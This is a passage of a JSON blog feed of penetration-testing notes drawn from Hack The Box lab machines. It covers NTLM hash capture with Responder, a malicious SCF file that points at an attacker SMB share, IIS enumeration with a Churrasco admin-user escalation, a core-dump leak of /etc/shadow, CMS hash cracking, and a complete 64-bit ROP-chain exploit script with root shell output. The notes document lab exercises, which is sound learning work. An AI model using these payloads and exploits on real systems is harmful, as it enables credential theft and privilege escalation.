class=\"se\">\\M</span>ichelleWat authenticated successfully<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> MichelleWat::SET:aaaaaaaaaaaaaaaa:3b1d30ff9e5129ad225cc8129e3a9fa5:010100000000000000aac7632685d701b14749bbc7f0a2db000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080000aac7632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Closing down connection <span class=\"o\">(</span>10.10.147.136,50223<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Remaining connections <span class=\"o\">[]</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Incoming connection <span class=\"o\">(</span>10.10.147.136,50224<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> AUTHENTICATE_MESSAGE <span class=\"o\">(</span>SET<span class=\"se\">\\M</span>ichelleWat,SET<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> User SET<span class=\"se\">\\M</span>ichelleWat authenticated successfully<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> MichelleWat::SET:aaaaaaaaaaaaaaaa:39d0e73f4909f98a02f8be457e765a0f:0101000000000000804060642685d701cefc2fd6b5e9dc17000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b0007000800804060642685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Closing down connection <span class=\"o\">(</span>10.10.147.136,50224<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Remaining connections <span class=\"o\">[]</span></code></pre></div></div><ul>  <li>You will be able to capture the NLMv2 hashes. You can now use hashcat to crack it.</li></ul><h2 id=\"other-info\">Other Info</h2><p>Here is the script that process the zip files inside smb share.</p><div class=\"language-batch highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>@echo <span class=\"na\">off</span><span class=\"kd\">SET</span> <span class=\"kd\">source</span><span class=\"o\">=</span><span class=\"s2\">\"C:\\Shares\\Files\"</span><span class=\"kd\">SET</span> <span class=\"kd\">extracted</span><span class=\"o\">=</span><span class=\"s2\">\"C:\\Shares\\extracted\"</span><span class=\"kd\">powershell</span><span class=\"err\">.exe</span> <span class=\"na\">-NoP -NonI -Command </span><span class=\"s2\">\"Expand-Archive '</span><span class=\"nv\">%source%</span><span class=\"s2\">\\*.zip' '</span><span class=\"nv\">%extracted%</span><span class=\"s2\">'\"</span><span class=\"kd\">FOR</span> <span class=\"na\">/f </span><span class=\"s2\">\"tokens=*\"</span> <span class=\"vm\">%%G</span> <span class=\"kd\">IN</span> <span class=\"o\">(</span><span class=\"s1\">'dir /s /b </span><span class=\"nv\">%extracted%</span><span class=\"s1\">\\..\\*.'</span><span class=\"o\">)</span> <span class=\"kd\">DO</span> <span class=\"o\">(</span><span class=\"kd\">explorer</span> <span class=\"vm\">%%G</span><span class=\"o\">)</span>\t<span class=\"nb\">ping</span> <span class=\"na\">-n </span><span class=\"m\">3</span> <span class=\"m\">127</span>.1&gt;NUL<span class=\"nb\">taskkill</span> <span class=\"na\">/IM </span><span class=\"kd\">explorer</span><span class=\"err\">.exe</span><span class=\"nb\">rmdir</span> <span class=\"nv\">%extracted%</span> <span class=\"na\">/q /s</span><span class=\"nb\">del</span> <span class=\"nv\">%source%</span>\\<span class=\"o\">*</span>.zip <span class=\"na\">-j</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.trendmicro.com/en_us/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html\">How Attackers are Using LNK Files to Download Malware</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/24/zipped-lnk-files-over-smb",
            
            
            
            "tags": ["windows","foothold","rce","smb"],
            
            "date_published": "2022-01-24T00:00:00+08:00",
            "date_modified": "2022-01-24T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/23/malicious-scf-upload",
            "title": "Malicious SCF File Upload",
            "summary": "Malicious SCF File Upload",
            "content_text": "OverviewAttacker can upload a maliciuous SCF file that will connect to attacker SMB share once victim accessed it.One example to access SCF file is via explorer.exe.%SystemRoot%\\explorer.exe \"C:\\Users\\victim\\desktop\"Environment Setup  Webapp that allows file upload  Some background script inside victim that access the uploaded filesSteps  Open responder on attacker machinesudo responder -I tun0  Create a malicious SCF file and name it as @evil.scf. Put the path to attacker share.[Shell]Command=2IconFile=\\\\10.10.14.13\\share\\icon.ico[Taskbar]Command=ToggleDesktop  Upload the file and wait for someone to access  You should be able to intercept NTLM credsReference  HTB Driver  SMB Share – SCF File Attacks – Penetration Testing Lab",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can upload a maliciuous SCF file that will connect to attacker SMB share once victim accessed it.</p><p>One example to access SCF file is via <code class=\"language-plaintext highlighter-rouge\">explorer.exe</code>.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>%SystemRoot%\\explorer.exe \"C:\\Users\\victim\\desktop\"</code></pre></div></div><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>Webapp that allows file upload</li>  <li>Some background script inside victim that access the uploaded files</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Open responder on attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo </span>responder <span class=\"nt\">-I</span> tun0</code></pre></div></div><ul>  <li>Create a malicious SCF file and name it as <code class=\"language-plaintext highlighter-rouge\">@evil.scf</code>. Put the path to attacker share.</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>[Shell]Command=2IconFile=\\\\10.10.14.13\\share\\icon.ico[Taskbar]Command=ToggleDesktop</code></pre></div></div><ul>  <li>Upload the file and wait for someone to access</li>  <li>You should be able to intercept NTLM creds</li></ul><h2 id=\"reference\">Reference</h2><ul>  <li>HTB Driver</li>  <li><a href=\"https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/\">SMB Share – SCF File Attacks – Penetration Testing Lab</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/23/malicious-scf-upload",
            
            
            
            "tags": ["windows","rce","foothold","smb"],
            
            "date_published": "2022-01-23T00:00:00+08:00",
            "date_modified": "2022-01-23T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/22/iis",
            "title": "IIS",
            "summary": "IIS",
            "content_text": "Ports  4XXXX/tcpCommon Pages  Under construction  404HeadersServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETRecon# Nmapnmap -p80 10.10.10.29 --script http-iis-webdav-vuln# Other way of getting IIS version. You will see# something like \"Server: Microsoft-IIS/10.0\"curl -I http://10.10.10.29# You can get the iisfinal.txt from hacktricks and# feed it to gobuster.curl https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-L_YlVBGlH_l7w9zCtQO%2F-L_YlWYOMUA7fr799GvH%2Fiisfinal.txt?alt=media&amp;token=de499b23-3599-45ce-ad7e-7800858b3dac -o iisfinal.txtgobuster dir -u http://10.10.10.29 -w iisfinal.txtInteresting Files# Constains sql connection strings, passwords and other# sensitive data. This is similar to `.htaccess` in apache.web.config# index fileiisstart.htmLogins  Brute force# Nmapnmap -p80 10.10.10.29 --script http-iis-short-name-brute  Try to access some DLLs, they may expose some login page.Downloads  10.X - latest version as of November 2021appcmd.exe# check if you have permissionsC:\\Windows\\system32\\inetsrv\\appcmd.exe list apppools# may show credentialsC:\\Windows\\system32\\inetsrv\\appcmd.exe list vdir  Decrypting IIS Passwords to Break Out of the DMZ: Part 2Some Vulnerabilities  IIS7 and higher RCE  Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation# https://github.com/Re4son/Churrascoc:\\Inetpub&gt;churrasco.exe -d \"net user /add &lt;username&gt; &lt;password&gt;\"c:\\Inetpub&gt;churrasco.exe -d \"net localgroup administrators &lt;username&gt; /add\"Other resources  IIS - Internet Information Services - HackTricks",
            "content_html": "<h2 id=\"ports\">Ports</h2><ul>  <li>4XXXX/tcp</li></ul><h2 id=\"common-pages\">Common Pages</h2><ul>  <li>Under construction</li></ul><p><img src=\"/spindel/assets/IIS/7BA3331D-7A92-4B19-98EE-2FD576CCA13C.png\" alt=\"\" /></p><ul>  <li>404</li></ul><p><img src=\"/spindel/assets/IIS/2CFBCCD1-49F9-400F-935E-9B3DA8A98BF6.png\" alt=\"\" /></p><h2 id=\"headers\">Headers</h2><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Server: Microsoft-IIS/6.0X-Powered-By: ASP.NET</code></pre></div></div><h2 id=\"recon\">Recon</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Nmap</span>nmap <span class=\"nt\">-p80</span> 10.10.10.29 <span class=\"nt\">--script</span> http-iis-webdav-vuln<span class=\"c\"># Other way of getting IIS version. You will see</span><span class=\"c\"># something like \"Server: Microsoft-IIS/10.0\"</span>curl <span class=\"nt\">-I</span> http://10.10.10.29<span class=\"c\"># You can get the iisfinal.txt from hacktricks and</span><span class=\"c\"># feed it to gobuster.</span>curl https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-L_YlVBGlH_l7w9zCtQO%2F-L_YlWYOMUA7fr799GvH%2Fiisfinal.txt?alt<span class=\"o\">=</span>media&amp;token<span class=\"o\">=</span>de499b23-3599-45ce-ad7e-7800858b3dac <span class=\"nt\">-o</span> iisfinal.txtgobuster <span class=\"nb\">dir</span> <span class=\"nt\">-u</span> http://10.10.10.29 <span class=\"nt\">-w</span> iisfinal.txt</code></pre></div></div><h2 id=\"interesting-files\">Interesting Files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Constains sql connection strings, passwords and other</span><span class=\"c\"># sensitive data. This is similar to `.htaccess` in apache.</span>web.config<span class=\"c\"># index file</span>iisstart.htm</code></pre></div></div><h2 id=\"logins\">Logins</h2><ul>  <li>Brute force</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Nmap</span>nmap <span class=\"nt\">-p80</span> 10.10.10.29 <span class=\"nt\">--script</span> http-iis-short-name-brute</code></pre></div></div><ul>  <li>Try to access some DLLs, they may expose some login page.</li></ul><p><img src=\"/spindel/assets/IIS/A482503E-8679-49FB-B8D4-A42BA2BCB6D9.png\" alt=\"\" /></p><h2 id=\"downloads\">Downloads</h2><ul>  <li>10.X - latest version as of November 2021</li></ul><h2 id=\"appcmdexe\">appcmd.exe</h2><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># check if you have permissions</span><span class=\"w\"></span><span class=\"n\">C:\\Windows\\system32\\inetsrv\\appcmd.exe</span><span class=\"w\"> </span><span class=\"nx\">list</span><span class=\"w\"> </span><span class=\"nx\">apppools</span><span class=\"w\"></span><span class=\"c\"># may show credentials</span><span class=\"w\"></span><span class=\"n\">C:\\Windows\\system32\\inetsrv\\appcmd.exe</span><span class=\"w\"> </span><span class=\"nx\">list</span><span class=\"w\"> </span><span class=\"nx\">vdir</span><span class=\"w\"></span></code></pre></div></div><ul>  <li><a href=\"https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/\">Decrypting IIS Passwords to Break Out of the DMZ: Part 2</a></li></ul><h2 id=\"some-vulnerabilities\">Some Vulnerabilities</h2><ul>  <li><a href=\"https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/\">IIS7 and higher RCE</a></li>  <li><a href=\"https://www.exploit-db.com/exploits/6705\">Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation</a></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># https://github.com/Re4son/Churrasco</span>c:<span class=\"se\">\\I</span>netpub&gt;churrasco.exe <span class=\"nt\">-d</span> <span class=\"s2\">\"net user /add &lt;username&gt; &lt;password&gt;\"</span>c:<span class=\"se\">\\I</span>netpub&gt;churrasco.exe <span class=\"nt\">-d</span> <span class=\"s2\">\"net localgroup administrators &lt;username&gt; /add\"</span></code></pre></div></div><h2 id=\"other-resources\">Other resources</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services\">IIS - Internet Information Services - HackTricks</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/22/iis",
            
            
            
            "tags": ["web","windows","enum"],
            
            "date_published": "2022-01-22T00:00:00+08:00",
            "date_modified": "2022-01-22T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/19/core-dump-technique",
            "title": "Core Dump Technique",
            "summary": "Core Dump Technique",
            "content_text": "OverviewAttacker can force crash a program to generate a coredump so he can read the buffered data (eg/etc/shadow ) inside.Environment  Program has SUID bit set-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count*  Program also forces core dump generationprctl(PR_SET_DUMPABLE, 1);  fs.suid_dumpable is set to 2.dasith@secret:/opt$ cat /proc/sys/fs/suid_dumpable2dasith@secret:/opt$ Steps  Run program and put a sensitive file and stop at another user inputdasith@secret:/opt$ ./count Enter source file/directory name: /etc/shadowTotal characters = 1187Total words      = 36Total lines      = 36Save results a file? [y/N]:   Background the programdasith@secret:/opt$ ./count Enter source file/directory name: /etc/shadowTotal characters = 1187Total words      = 36Total lines      = 36Save results a file? [y/N]: ^Z[1]+  Stopped                 ./countdasith@secret:/opt$   Send SIGSEGV signal. You can also use kill -BUS PID.dasith@secret:/opt$ kill -SIGSEGV `pidof count`  Resume the job and you will see core dump has been generateddasith@secret:/opt$ fg./countSegmentation fault (core dumped)dasith@secret:/opt$ ls -lrt /var/crash/total 32-rw-r----- 1 dasith dasith 28756 Dec 11 04:51 _opt_count.1000.crashdasith@secret:/opt$   To analyze the coredump, use apport-unpack and open CoreDump filedasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-reportdasith@secret:/opt$ strings /tmp/crash-report/CoreDump | grep rootroot:$6$/0f5J.S8.u.dA78h$xSyDRhh5Zf18Ha9XNVo5dvPhxnI0i7D/uD8T5FcYgN1FYMQbvkZakMgjgm3bhtS6hgKWBcD/QJqPgQR6cycFj.:18873:0:99999:7:::dasith@secret:/opt$ References  HTB secret",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can force crash a program to generate a coredump so he can read the buffered data (eg<code class=\"language-plaintext highlighter-rouge\">/etc/shadow</code> ) inside.</p><h2 id=\"environment\">Environment</h2><ul>  <li>Program has SUID bit set</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">-rwsr-xr-x</span> 1 root root 17824 Oct  7 10:03 count<span class=\"k\">*</span></code></pre></div></div><ul>  <li>Program also forces core dump generation</li></ul><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">prctl</span><span class=\"p\">(</span><span class=\"n\">PR_SET_DUMPABLE</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">);</span></code></pre></div></div><ul>  <li><code class=\"language-plaintext highlighter-rouge\">fs.suid_dumpable</code> is set to 2.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span><span class=\"nb\">cat</span> /proc/sys/fs/suid_dumpable2dasith@secret:/opt<span class=\"nv\">$ </span></code></pre></div></div><h2 id=\"steps\">Steps</h2><ul>  <li>Run program and put a sensitive file and stop at another user input</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span>./count Enter <span class=\"nb\">source </span>file/directory name: /etc/shadowTotal characters <span class=\"o\">=</span> 1187Total words      <span class=\"o\">=</span> 36Total lines      <span class=\"o\">=</span> 36Save results a file? <span class=\"o\">[</span>y/N]: </code></pre></div></div><ul>  <li>Background the program</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span>./count Enter <span class=\"nb\">source </span>file/directory name: /etc/shadowTotal characters <span class=\"o\">=</span> 1187Total words      <span class=\"o\">=</span> 36Total lines      <span class=\"o\">=</span> 36Save results a file? <span class=\"o\">[</span>y/N]: ^Z<span class=\"o\">[</span>1]+  Stopped                 ./countdasith@secret:/opt<span class=\"nv\">$ </span></code></pre></div></div><ul>  <li>Send <code class=\"language-plaintext highlighter-rouge\">SIGSEGV</code> signal. You can also use <code class=\"language-plaintext highlighter-rouge\">kill -BUS PID</code>.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span><span class=\"nb\">kill</span> <span class=\"nt\">-SIGSEGV</span> <span class=\"sb\">`</span>pidof count<span class=\"sb\">`</span></code></pre></div></div><ul>  <li>Resume the job and you will see core dump has been generated</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span><span class=\"nb\">fg</span>./countSegmentation fault <span class=\"o\">(</span>core dumped<span class=\"o\">)</span>dasith@secret:/opt<span class=\"nv\">$ </span><span class=\"nb\">ls</span> <span class=\"nt\">-lrt</span> /var/crash/total 32<span class=\"nt\">-rw-r-----</span> 1 dasith dasith 28756 Dec 11 04:51 _opt_count.1000.crashdasith@secret:/opt<span class=\"nv\">$ </span></code></pre></div></div><ul>  <li>To analyze the coredump, use <code class=\"language-plaintext highlighter-rouge\">apport-unpack</code> and open <code class=\"language-plaintext highlighter-rouge\">CoreDump</code> file</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span>apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-reportdasith@secret:/opt<span class=\"nv\">$ </span>strings /tmp/crash-report/CoreDump | <span class=\"nb\">grep </span>rootroot:<span class=\"nv\">$6$/</span>0f5J.S8.u.dA78h<span class=\"nv\">$xSyDRhh5Zf18Ha9XNVo5dvPhxnI0i7D</span>/uD8T5FcYgN1FYMQbvkZakMgjgm3bhtS6hgKWBcD/QJqPgQR6cycFj.:18873:0:99999:7:::dasith@secret:/opt<span class=\"nv\">$ </span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB secret</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/19/core-dump-technique",
            
            
            
            "tags": ["linux","privesc"],
            
            "date_published": "2022-01-19T00:00:00+08:00",
            "date_modified": "2022-01-19T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/16/cms-made-simple",
            "title": "CMS Made Simple",
            "summary": "CMS Made Simple",
            "content_text": "OverviewOpen Source Content Management System : : CMS Made SimpleVersion  Via changelog /doc/CHANGELOG.txt  Inside admin page, bottom partCredentialsadmin:  Passwords are  stored in database using 1-way password schememysql&gt; select user_id,username,password from cms_users;+---------+----------+----------------------------------+| user_id | username | password                         |+---------+----------+----------------------------------+|       1 | admin    | 9dfb6c17c8992e3a821c47b68fe8e76a ||       2 | editor   | 5aee9dbd2a188839105073571bee1b1f |  You can crack it via hascat# 62def4866937f08cc13bab43bb14e6f7 - hashed password# 5a599ef579066807 - salthashcat -m 20 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 /usr/share/wordlists/rockyou.txtInteresting URL PathsReference: http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk/Interesting Filesconfig.phpCookie Format# Example:# CMSSESSID9d372ef93962=75gsp75a2vdo6ijapmnvqrkdb2CMSSESSID*Some Exploits# CVE-2019-9053 - change TIME to 2 for better resultsearchploit -m php/webapps/46635.pyReferences  Identifying &amp; Exploiting SSTI &amp; XSS in CMS Made Simple",
            "content_html": "<h2 id=\"overview\">Overview</h2><p><img src=\"/spindel/assets/CMS%20Made%20Simple/20E7EA44-40D7-4648-B62C-75B0B1FF9941.png\" alt=\"\" /></p><p><a href=\"http://www.cmsmadesimple.org/\">Open Source Content Management System : : CMS Made Simple</a></p><h2 id=\"version\">Version</h2><ul>  <li>Via changelog <code class=\"language-plaintext highlighter-rouge\">/doc/CHANGELOG.txt</code></li>  <li>Inside admin page, bottom part</li></ul><h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>admin:</code></pre></div></div><ul>  <li>Passwords are  stored in database using 1-way password scheme</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>mysql&gt; select user_id,username,password from cms_users;+---------+----------+----------------------------------+| user_id | username | password                         |+---------+----------+----------------------------------+|       1 | admin    | 9dfb6c17c8992e3a821c47b68fe8e76a ||       2 | editor   | 5aee9dbd2a188839105073571bee1b1f |</code></pre></div></div><ul>  <li>You can crack it via hascat</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># 62def4866937f08cc13bab43bb14e6f7 - hashed password</span><span class=\"c\"># 5a599ef579066807 - salt</span>hashcat <span class=\"nt\">-m</span> 20 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 /usr/share/wordlists/rockyou.txt</code></pre></div></div><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><p><img src=\"/spindel/assets/CMS%20Made%20Simple/49CFCD40-2C62-453A-872C-91DEAAAF5E2C.png\" alt=\"\" /></p><p>Reference: http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk/</p><h2 id=\"interesting-files\">Interesting Files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>config.php</code></pre></div></div><h2 id=\"cookie-format\">Cookie Format</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Example:</span><span class=\"c\"># CMSSESSID9d372ef93962=75gsp75a2vdo6ijapmnvqrkdb2</span>CMSSESSID<span class=\"k\">*</span></code></pre></div></div><h2 id=\"some-exploits\">Some Exploits</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># CVE-2019-9053 - change TIME to 2 for better result</span>searchploit <span class=\"nt\">-m</span> php/webapps/46635.py</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.netsparker.com/blog/web-security/exploiting-ssti-and-xss-in-cms-made-simple/\">Identifying &amp; Exploiting SSTI &amp; XSS in CMS Made Simple</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/16/cms-made-simple",
            
            
            
            "tags": ["web","cms","enum"],
            
            "date_published": "2022-01-16T00:00:00+08:00",
            "date_modified": "2022-01-16T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/15/bypass-aslr-nx-64-bit-rop-chain",
            "title": "Bypass ASLR + NX (64-bit) - ROP Chain",
            "summary": "Bypass ASLR + NX (64-bit) - ROP Chain",
            "content_text": "OverviewIf ASLR and NX is enabled on a 64-bit program, this means we cannot execute code on stack and address space of libraries changes on every program run.In this technique, we can find some ROP gadgets whose address are static and we can use them to do setuid(0) and drop to a shell using execvpe().Environment Setup  SETUID program whose vulnerable to buffer overflow. In this example, we can see that even though fgets is assumed to be safe from bufferoverflow, a misconfigured program is still vulnerable.// filename: iptctl// [...redacted...]// 360 bytes here#define BUFFSIZE 360void interactive(char *ip, char *action, char *name){        char inputAddress[16];        // but destination buffer locally is 10 bytes only!        // this is the buffer overflow part        char inputAction[10];        printf(\"Entering interactive mode\\n\");        printf(\"Action(allow|restrict|show): \");        // hence, fgets is not using the correct buffer size        fgets(inputAction,BUFFSIZE,stdin);        // this also have vulnerable fgets but we will ignore        // this part since its hard to send arbritrary input        // here, inputAddress is being validated properly        fgets(inputAddress,BUFFSIZE,stdin);        fflush(stdin);        inputAddress[strlen(inputAddress)-1] = 0;        // this is the validation part, isValidIpAddress is        // validated properly but not isValidAction        if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){                printf(\"Usage: %s allow|restrict|show IP\\n\", name);                exit(0);        }        strcpy(ip, inputAddress);        strcpy(action, inputAction);        return;// [...redacted...]We will also use GDB peda as our debugger.Steps  Get a copy of binary and put it on your attacker machine  Determine protections# check ASLR on victim machinepenelope@redcross:/dev/shm$ cat /proc/sys/kernel/randomize_va_space2penelope@redcross:/dev/shm$# check PIE on gdb peda on attacker machinegdb-peda$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partialgdb-peda$   Find offset to RIP# set breakpointsbr *interactive+73br *interactive+73# create pattern - 50 is more than enough since we only need# 10 bytes to overflowpattern_create 50# run interactivelygdb-peda$ run -iStarting program: /home/kali/data/practice/hack_the_box/linux/redcross/iptctl -iEntering interactive modeAction(allow|restrict|show): allowAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA# [...redacted....]# find offset - get value of \"saved rip\" firstinfo frame pattern_offset 0x4541412941413b41# offset is 29  Since we cannot execute code on stack, we need to find a static address of gadgets we can use. These addresses will remain the same inside victim and attacker machine. I believe the reason is because PIE is not enabled on the program. We also wanted to do setuid(0) first before dropping to shell via execvp so that can gain the effective UID of root. Our payload structure will look like this. For detailed information about the payload structure, see the section below “Explaining the payload structure”.payload = \"allow\" + \"A\"*29 + pop_rdi_addr + null + setuid_addr + pop_rdi_addr + sh_addr + pop_rsi_pop_r15_addr + null + null + execvp_addr + \"\\n\" + \"1.1.1.1\" + \"\\n\"  Now let’s find the values# pop_rdi_addrgdb-peda$ ropsearch \"pop rdi\"# null\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"# setuid_addrgdb-peda$ plt# [...redacted...]Breakpoint 37 at 0x400780 (setuid@plt)# [...redacted...]gdb-peda$# sh_addrgdb-peda$ find \"sh\"# [...redacted...]    iptctl : 0x40046e --&gt; 0x7063727473006873 ('sh')# [...redacted...]# pop_rsi_pop_r15_addrgdb-peda$ ropsearch \"pop rsi\"# [...redacted...]0x00400de1 : (b'5e415fc3')\tpop rsi; pop r15; retgdb-peda$ # execvp_addrgdb-peda$ pltBreakpoint 42 at 0x400760 (execvp@plt)# [...redacted...]gdb-peda$   Let’s construct our final python script. I will not use pwn tools to show how this is being done without any helper functions.#!/usr/bin/env python# gadgets and variables - take note that due to being little# endian, we need to consutrct the memory addresses in reverse# order. For example, if we see an addres in gdb which is# \"0x400760\" in python it will be \"\\x60\\x07\\x40\".# # Another thing to take note of is that since we are dealing# with 64-bit architecture, you might often see in debuggers# that they only display 6 bytes of address instead of 8.# That's because the remaining 2 bytes are not used. So in our# python script, just replace the missing 2 bytes with NULL# bytes \"\\x00\\x00\".                                                           pop_rdi_addr = \"\\xe3\\x0d\\x40\\x00\\x00\\x00\\x00\\x00\"                                                                                                   sh_addr = \"\\x6e\\04\\x40\\x00\\x00\\x00\\x00\\x00\"                                                                                               pop_rsi_pop_r15_addr = \"\\xe1\\x0d\\x40\\x00\\x00\\x00\\x00\\x00\"                                                                                            execvp_addr = \"\\x60\\x07\\x40\\x00\\x00\\x00\\x00\\x00\"                                                                                                   setuid_addr = \"\\x80\\x07\\x40\\x00\\x00\\x00\\x00\\x00\"                                null = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"                                                                                payload = \"allow\" + \"A\"*29payload += pop_rdi_addr + null + setuid_addrpayload += pop_rdi_addr + sh_addr + pop_rsi_pop_r15_addr + null + null + execvp_addr + \"\\n\"payload += \"1.1.1.1\" + \"\\n\"print(payload)  Copy this script any run on victim machinepenelope@redcross:/dev/shm$ (python2 bof.py;cat -) | /opt/iptctl/iptctl -iEntering interactive modeiduid=0(root) gid=1000(penelope) egid=0(root) groups=0(root),4(adm),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),116(scanner),1000(penelope),1003(mailadm)Explaining the payload structureFirst things to understand is how the calling conventions work for 32-bit and 64-bit architectures.execvp()NULLNULLpop rsi; pop r15; ret\"sh\"pop rdi; retsetuid()NULLpop rdi; ret\"allow\" + \"A\"*29To better understand, let’s divide the payload into different stack frames.# stack frame 2execvp()NULLNULLpop rsi; pop 